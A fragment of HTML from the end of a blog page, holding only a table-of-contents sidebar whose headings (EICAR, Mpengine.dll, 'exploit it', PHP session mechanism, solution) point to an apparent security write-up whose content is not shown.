href="#EICAR"><span class="toc-number">1.3.1.</span> <span class="toc-text">EICAR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mpengine-dll"><span class="toc-number">1.3.2.</span> <span class="toc-text">Mpengine.dll</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用它"><span class="toc-number">1.4.</span> <span class="toc-text">利用它</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-note"><span class="toc-number">1.5.</span> <span class="toc-text">php note</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-session-机制"><span class="toc-number">1.5.1.</span> <span class="toc-text">php session 机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解决办法"><span class="toc-number">1.5.2.</span> <span class="toc-text">解决办法</span></a></li></ol></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>